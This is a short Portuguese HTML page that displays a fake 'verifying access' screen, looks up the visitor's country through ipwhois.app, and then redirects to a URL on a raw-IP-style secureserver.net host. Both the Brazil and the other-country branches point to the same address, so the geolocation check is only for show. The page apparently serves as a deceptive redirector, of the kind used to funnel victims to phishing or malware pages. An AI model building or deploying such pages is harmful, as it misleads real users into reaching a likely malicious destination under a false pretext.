<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirecionando...</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: grid;
      place-items: center;
      font-family: Arial, sans-serif;
      background: #0f172a;
      color: white;
      text-align: center;
    }
    .box {
      background: #1e293b;
      padding: 30px;
      border-radius: 14px;
      max-width: 500px;
    }
    p { color: #cbd5e1; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Verificando acesso...</h1>
    <p id="status">Aguarde...</p>
    <p>Redirecionando em <span id="count">3</span>s</p>
  </div>

  <script>
    const DESTINO_BR = "https://65.61.205.92.host.secureserver.net/HJ534/";
    const DESTINO_OUTROS = "https://65.61.205.92.host.secureserver.net/HJ534/";

    const statusEl = document.getElementById("status");
    const countEl = document.getElementById("count");

    function redirecionar(destino) {
      let tempo = 0;
      countEl.innerText = tempo;

      const intervalo = setInterval(() => {
        tempo--;
        countEl.innerText = tempo;

        if (tempo <= 0) {
          clearInterval(intervalo);
          window.location.href = destino;
        }
      }, 1000);
    }

    async function iniciar() {
      let destino = DESTINO_OUTROS;

      try {
        const res = await fetch("https://ipwhois.app/json/");
        const data = await res.json();

        console.log("Geo:", data);

        if (data && data.country_code === "BR") {
          statusEl.innerText = "Acesso do Brasil detectado.";
          destino = DESTINO_BR;
        } else {
          statusEl.innerText = "Disponível apenas no Brasil.";
        }
      } catch (e) {
        console.error("Erro:", e);
        statusEl.innerText = "Erro ao verificar localização.";
      }

      redirecionar(destino);
    }

    iniciar();
  </script>
</body>
</html>
